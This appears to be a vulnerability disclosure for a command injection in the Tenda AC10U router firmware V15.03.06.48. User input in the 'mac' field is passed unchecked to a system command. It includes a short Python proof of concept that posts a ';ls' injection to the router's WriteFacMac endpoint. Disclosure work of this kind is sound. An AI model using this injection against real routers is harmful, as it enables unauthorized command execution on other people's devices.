## Overview

- Firmware download website: https://www.tendacn.com/download/detail-3170.html

## Affected version

AC10U v1.0 Firmware V15.03.06.48

## Vulnerability details

In Tenda AC10U v1.0 Firmware V15.03.06.48 firmware, we discovered a command injection vulnerablility in `formWriteFacMac` function in the `mac` parameter and the `mac` varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `mac` can trigger this security vulnerability.

![image-20240313164524593](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313164524593.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WriteFacMac"
payload = ";ls"

data = {"mac": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313164800839](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313164800839.png)
